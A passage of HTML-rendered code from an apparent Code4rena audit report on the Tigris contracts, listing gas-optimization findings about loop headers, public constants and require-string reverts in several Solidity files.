class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L220</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"215\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">325</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L53</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"216\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"217\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">304</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"218\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_codeOwnersL</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_referredAL</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L70</p>\n<h2 id=\"g29--using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g29--using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g29  using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑29]  Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"219\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minPeriod</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">7</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxPeriod</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">365</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L12</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"220\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e10</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 100%</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L16</p>\n<h2 id=\"g30--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g30--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g30  use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑30]  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas</p>\n<p><em>There are 64 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"221\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;!Asset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_sender</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Expired&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!BondAsset&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] == </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DAY</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Bad epoch&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">period</span><span class=\"mtk1\">+</span><span class=\"mtk12\">_period</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">365</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MAX PERIOD&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!expire&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:                  </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Bond owner priority&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">173</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_claimer</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] == </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DAY</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Bad epoch&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expired</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Expired!&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">332</span><span class=\"mtk1\">:              </span><span 